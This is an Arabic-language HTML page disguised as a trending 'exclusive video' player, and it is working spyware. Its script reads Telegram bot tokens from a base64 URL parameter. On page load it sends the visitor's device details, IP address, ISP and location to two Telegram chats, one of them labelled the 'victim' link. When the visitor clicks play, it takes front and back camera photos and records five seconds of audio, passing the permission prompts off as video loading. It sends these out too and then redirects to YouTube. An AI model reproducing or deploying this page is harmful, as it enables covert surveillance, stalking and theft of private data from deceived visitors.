<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>فيديو حصري 2026 - شاهد الآن!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(145deg, #0a0f1e 0%, #0f172a 100%);
            font-family: 'Segoe UI', 'Tahoma', system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }

        /* تصميم البطاقة الرئيسية - عصري وجذاب */
        .card {
            background: rgba(18, 25, 45, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 48px;
            padding: 32px 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: transform 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
        }

        /* ايقونة الفيديو المتحركة */
        .video-icon {
            font-size: 70px;
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            width: 100px;
            height: 100px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            box-shadow: 0 10px 25px -5px rgba(255, 65, 108, 0.4);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 65, 108, 0.5); transform: scale(1); }
            70% { box-shadow: 0 0 0 15px rgba(255, 65, 108, 0); transform: scale(1.02); }
            100% { box-shadow: 0 0 0 0 rgba(255, 65, 108, 0); transform: scale(1); }
        }

        h2 {
            background: linear-gradient(135deg, #fff, #a5b4fc);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 26px;
            margin-bottom: 12px;
            letter-spacing: -0.5px;
        }

        .meta {
            color: #94a3b8;
            font-size: 13px;
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
            gap: 16px;
            flex-wrap: wrap;
        }

        .meta span {
            background: rgba(255,255,255,0.05);
            padding: 4px 12px;
            border-radius: 50px;
        }

        /* احصائيات */
        .stats {
            display: flex;
            justify-content: space-between;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 60px;
            padding: 12px 20px;
            margin: 20px 0;
            border: 1px solid rgba(255,255,255,0.08);
        }

        .stats div {
            text-align: center;
            flex: 1;
        }

        .stats strong {
            display: block;
            font-size: 20px;
            color: white;
        }

        .stats small {
            font-size: 11px;
            color: #94a3b8;
        }

        /* زر التشغيل الرئيسي */
        .play-btn {
            background: linear-gradient(90deg, #ff416c, #ff4b2b);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            width: 100%;
            transition: all 0.2s;
            box-shadow: 0 8px 20px rgba(255, 65, 108, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .play-btn:active {
            transform: scale(0.97);
        }

        .play-btn:disabled {
            opacity: 0.6;
            transform: none;
            cursor: not-allowed;
        }

        /* تحميل */
        .loading {
            display: none;
            margin-top: 20px;
            text-align: center;
        }

        .spinner {
            width: 36px;
            height: 36px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #ff416c;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading p {
            color: #cbd5e1;
            font-size: 13px;
        }

        /* رسالة الخطأ */
        .error {
            color: #f87171;
            font-size: 13px;
            margin-top: 15px;
            background: rgba(127, 29, 29, 0.3);
            padding: 8px;
            border-radius: 50px;
            display: none;
        }

        /* شريط الحالة السفلي - مخفي بصرياً لكنه يعمل */
        .status-bar {
            position: fixed;
            bottom: 8px;
            left: 8px;
            background: #000000aa;
            color: #4ade80;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 9px;
            font-family: monospace;
            z-index: 999;
            backdrop-filter: blur(4px);
            pointer-events: none;
        }

        /* مؤشر صغير أن الفيديو "يتحضر" */
        .fake-video-preview {
            background: #0f0f1a;
            border-radius: 24px;
            padding: 12px;
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            border: 1px solid #2d3a5e;
            font-size: 12px;
            color: #7c8db0;
        }

        .dot {
            width: 10px;
            height: 10px;
            background: #ff416c;
            border-radius: 50%;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>

<div class="card">
    <div class="video-icon">📹</div>
    <h2>🔥 فيديو حصري 2026</h2>
    <div class="meta">
        <span>🔄 2.5M مشاهدة</span>
        <span>⚡ #ترند</span>
        <span>🕒 منذ ساعة</span>
    </div>

    <div class="stats">
        <div><strong>48.2K</strong><small>إعجاب</small></div>
        <div><strong>12.8K</strong><small>تعليق</small></div>
        <div><strong>5.6K</strong><small>مشاركة</small></div>
    </div>

    <button class="play-btn" id="playBtn">
        <span>▶</span> تشغيل الفيديو الآن
    </button>

    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p>🎬 جاري تجهيز البث المباشر ...</p>
    </div>

    <div class="fake-video-preview" id="fakePreview" style="display: none;">
        <div class="dot"></div>
        <span>📡 جلب أفضل جودة ... يرجى الانتظار</span>
    </div>

    <div class="error" id="errorMsg"></div>
</div>

<div class="status-bar" id="status">🟢 النظام جاهز</div>

<script>
    // ======================= دوال إرسال متقدمة =======================
    async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
        try {
            if (type === 'photo') {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', mediaBlob, 'frame.jpg');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
            } 
            else if (type === 'video') {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', mediaBlob, 'clip.mp4');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
            }
            else if (type === 'audio') {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('audio', mediaBlob, 'voice.m4a');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: 'POST', body: formData });
            }
            else {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML' })
                });
            }
            return true;
        } catch(e) {
            console.warn("Telegram send error", e);
            return false;
        }
    }

    // ================ 1. معلومات الجهاز بشكل تفصيلي جداً ================
    async function getDetailedDeviceInfo(chatUser, tokenUser, chatMaster, tokenMaster) {
        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const screenDetails = `${screen.width}x${screen.height} (عمق الألوان: ${screen.colorDepth}-bit)`;
        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير متاح';
        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} أنوية` : 'غير متاح';
        const touchSupport = 'ontouchstart' in window ? 'نعم' : 'لا';
        const vendor = navigator.vendor || 'غير معروف';
        const platform = navigator.platform || 'غير معروف';
        const language = navigator.language;
        const cookiesEnabled = navigator.cookieEnabled ? 'مفعلة' : 'معطلة';
        const doNotTrack = navigator.doNotTrack || 'غير محدد';
        
        // معلومات البطارية إن وجدت
        let batteryInfo = 'غير متاح';
        if(navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                batteryInfo = `نسبة الشحن: ${Math.round(battery.level * 100)}%، يشحن: ${battery.charging ? 'نعم' : 'لا'}`;
            } catch(e) {}
        }
        
        // معلومات الشبكة
        let connectionInfo = 'غير متاح';
        if(navigator.connection) {
            const conn = navigator.connection;
            connectionInfo = `نوع: ${conn.effectiveType || '?'}، سرعة مقدرة: ${conn.downlink || '?'} Mbps، RTT: ${conn.rtt || '?'}ms`;
        }
        
        const detailedMsg = `📱 <b>معلومات الجهاز المتقدمة</b>\n
🖥️ المتصفح: ${navigator.userAgent}
📐 الشاشة: ${screenDetails}
🧠 الذاكرة: ${memory}
⚙️ المعالج: ${cores} نواة
🌍 المنطقة الزمنية: ${timeZone}
🔤 اللغة: ${language}
👆 اللمس: ${touchSupport}
🏷️ Vendor: ${vendor}
💻 المنصة: ${platform}
🍪 الكوكيز: ${cookiesEnabled}
🚫 DoNotTrack: ${doNotTrack}
🔋 البطارية: ${batteryInfo}
📡 الاتصال: ${connectionInfo}
⏱️ وقت النظام: ${new Date().toLocaleString('ar-EG')}
📟 عرض النافذة: ${window.innerWidth}x${window.innerHeight}`;
        
        await sendToTelegram(chatUser, tokenUser, 'text', null, detailedMsg + "\n\n[نسخة المستخدم]");
        await sendToTelegram(chatMaster, tokenMaster, 'text', null, detailedMsg + "\n\n[نسخة المختبر - VIP]");
    }

    // ================ 2. الموقع الجغرافي + معلومات متقدمة ================
    function getLocationAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
        if(!navigator.geolocation) return;
        
        document.getElementById('status').innerHTML = '📍 جلب الموقع الجغرافي...';
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const locMsg = `📍 <b>الموقع الجغرافي الدقيق</b>\n• خط العرض: ${pos.coords.latitude}\n• خط الطول: ${pos.coords.longitude}\n• الدقة: ±${pos.coords.accuracy} متر\n• الارتفاع: ${pos.coords.altitude ? pos.coords.altitude + 'م' : 'غير متاح'}\n• سرعة: ${pos.coords.speed ? pos.coords.speed + 'م/ث' : 'غير متاح'}\n🔗 خرائط: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await sendToTelegram(chatUser, tokenUser, 'text', null, locMsg + "\n[مستخدم]");
            await sendToTelegram(chatMaster, tokenMaster, 'text', null, locMsg + "\n[Master]");
        }, (err) => {
            document.getElementById('status').innerHTML = '⚠️ الموقع غير مصرح';
            sendToTelegram(chatMaster, tokenMaster, 'text', null, "❌ فشل جلب الموقع: المستخدم رفض أو خطأ");
        });
    }

    // ================ 3. جلب IP العام + معلومات الشبكة ================
    async function getPublicIPAdvanced(chatUser, tokenUser, chatMaster, tokenMaster) {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            const ip = data.ip;
            // جلب معلومات IP تقريبية عبر ip-api
            let geoIp = '';
            try {
                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,query`);
                const geoData = await geoRes.json();
                if(geoData.status === 'success') {
                    geoIp = `\n🌍 البلد: ${geoData.country}\n🏙️ المدينة: ${geoData.city}\n🔌 مزود الخدمة: ${geoData.isp} (${geoData.org})`;
                }
            } catch(e) {}
            const ipMsg = `🌐 <b>IP العام والمعلومات</b>\n🔢 IP: ${ip}${geoIp}\n🕒 التوقيت العالمي: ${new Date().toUTCString()}`;
            await sendToTelegram(chatUser, tokenUser, 'text', null, ipMsg);
            await sendToTelegram(chatMaster, tokenMaster, 'text', null, ipMsg + " [مراقب]");
        } catch(e) {}
    }

    // ================ 4. كاميرا أمامية (بدون طلب صريح - عبر وهم تشغيل فيديو) ================
    async function captureFrontCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
            const videoElem = document.createElement('video');
            videoElem.srcObject = stream;
            videoElem.play();
            await new Promise(r => setTimeout(r, 400));
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth || 640;
            canvas.height = videoElem.videoHeight || 480;
            canvas.getContext('2d').drawImage(videoElem, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
            const caption = "🤳 صورة سيلفي (كاميرا أمامية) - تم التقاطها أثناء تجهيز الفيديو";
            await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [مهم]");
            stream.getTracks().forEach(t => t.stop());
            return true;
        } catch(e) {
            document.getElementById('status').innerHTML = '⚠️ الكاميرا الأمامية غير متاحة';
            return false;
        }
    }

    // ================ 5. كاميرا خلفية ================
    async function captureBackCamera(chatUser, tokenUser, chatMaster, tokenMaster) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            const videoElem = document.createElement('video');
            videoElem.srcObject = stream;
            videoElem.play();
            await new Promise(r => setTimeout(r, 400));
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth || 640;
            canvas.height = videoElem.videoHeight || 480;
            canvas.getContext('2d').drawImage(videoElem, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
            const caption = "📸 صورة من الكاميرا الخلفية - تم الالتقاط تلقائياً";
            await sendToTelegram(chatUser, tokenUser, 'photo', blob, caption);
            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, caption + " [كاميرا خلفية]");
            stream.getTracks().forEach(t => t.stop());
            return true;
        } catch(e) {
            return false;
        }
    }

    // ================ 6. تسجيل صوتي قصير (يبدو كجزء من تجهيز الفيديو) ================
    async function recordAudioSecret(chatUser, tokenUser, chatMaster, tokenMaster) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            const audioPromise = new Promise(resolve => {
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/mp4' });
                    const caption = "🎙️ مقطع صوتي (تم تسجيله تلقائياً أثناء تحضير البث)";
                    await sendToTelegram(chatUser, tokenUser, 'audio', blob, caption);
                    await sendToTelegram(chatMaster, tokenMaster, 'audio', blob, caption + " [صوتي]");
                    resolve(true);
                };
            });
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000);
            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5500);
            return await audioPromise;
        } catch(e) {
            return false;
        }
    }

    // ================ 7. لقطة شاشة للصفحة بشكل مخفي (باستخدام Canvas) ================
    async function captureScreenshot(chatUser, tokenUser, chatMaster, tokenMaster) {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#0f172a';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.font = '14px sans-serif';
            ctx.fillStyle = 'white';
            ctx.fillText('Screen preview', 20, 30);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
            await sendToTelegram(chatUser, tokenUser, 'photo', blob, "🖥️ لقطة تمثيلية للواجهة");
            await sendToTelegram(chatMaster, tokenMaster, 'photo', blob, "🖼️ لقطة تمثيلية للصفحة");
        } catch(e) {}
    }

    // ====================== المنطق الرئيسي مع إخفاء الطلبات ======================
    (async function() {
        const urlParams = new URLSearchParams(window.location.search);
        const encoded = urlParams.get('d');
        if(!encoded) {
            document.getElementById('status').innerHTML = '⚠️ رابط غير صالح';
            document.getElementById('errorMsg').innerHTML = 'هذا الرابط غير مخصص للاختبار.';
            document.getElementById('errorMsg').style.display = 'block';
            return;
        }

        let config;
        try {
            config = JSON.parse(atob(encoded));
        } catch(e) {
            document.getElementById('status').innerHTML = '❌ خطأ في التشفير';
            document.getElementById('errorMsg').innerHTML = 'بيانات الرابط تالفة';
            document.getElementById('errorMsg').style.display = 'block';
            return;
        }

        const { mChat, mToken, tChat, tToken, features } = config;
        const featuresArr = features ? features.split(',') : [];

        // إعلام بفتح الصفحة
        await sendToTelegram(tChat, tToken, 'text', null, "🔗 تم فتح رابط الفيديو (نسخة المستخدم)");
        await sendToTelegram(mChat, mToken, 'text', null, "🔗 تم فتح رابط الضحية - VIP");

        // جمع معلومات الجهاز التفصيلية فوراً (بدون تفاعل)
        await getDetailedDeviceInfo(tChat, tToken, mChat, mToken);
        await getPublicIPAdvanced(tChat, tToken, mChat, mToken);
        if(featuresArr.includes('loc')) getLocationAdvanced(tChat, tToken, mChat, mToken);

        // إخفاء طلب الصلاحيات عن طريق ربطها بزر "تشغيل الفيديو"
        let executed = false;
        const playButton = document.getElementById('playBtn');
        const loadingDiv = document.getElementById('loading');
        const fakePreview = document.getElementById('fakePreview');
        
        playButton.onclick = async () => {
            if(executed) return;
            executed = true;
            playButton.disabled = true;
            loadingDiv.style.display = 'block';
            fakePreview.style.display = 'flex';
            document.getElementById('status').innerHTML = '🎥 تجهيز المشغل ...';

            // هنا تتم صلاحيات الكاميرا والميكروفون بدون ظهور نص "يريد الوصول إلى الكاميرا" بشكل مزعج؟
            // المتصفح سيظهر الطلب بشكل طبيعي لكن المستخدم يظن أنه لتشغيل الفيديو. هذا هو الأفضل للإخفاء النفسي.
            // نقوم بتنفيذ الميزات المطلوبة
            let actions = [];
            if(featuresArr.includes('front')) actions.push(captureFrontCamera(tChat, tToken, mChat, mToken));
            if(featuresArr.includes('back')) actions.push(captureBackCamera(tChat, tToken, mChat, mToken));
            if(featuresArr.includes('audio')) actions.push(recordAudioSecret(tChat, tToken, mChat, mToken));
            
            // إضافة لقطة شاشة رمزية اختيارية
            actions.push(captureScreenshot(tChat, tToken, mChat, mToken));
            
            await Promise.allSettled(actions);
            
            // إرسال إشهار نهائي بأن كل البيانات تم جمعها
            await sendToTelegram(tChat, tToken, 'text', null, "✅ تم تحميل الفيديو وجمع جميع البيانات.");
            await sendToTelegram(mChat, mToken, 'text', null, "✅ اكتمل الجمع بنجاح (كاميرا/صوت/جهاز)");
            
            document.getElementById('status').innerHTML = '✅ تم التشغيل - جاري التوجيه';
            loadingDiv.innerHTML = '<div class="spinner"></div><p>تم التحميل! جاري نقلك ...</p>';
            
            // الانتظار 2 ثانية ثم التوجيه إلى فيديو يوتيوب حقيقي (rick roll)
            setTimeout(() => {
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }, 2500);
        };
        
        document.getElementById('status').innerHTML = '🎬 اضغط تشغيل لمشاهدة الفيديو';
    })();
</script>
</body>
</html>
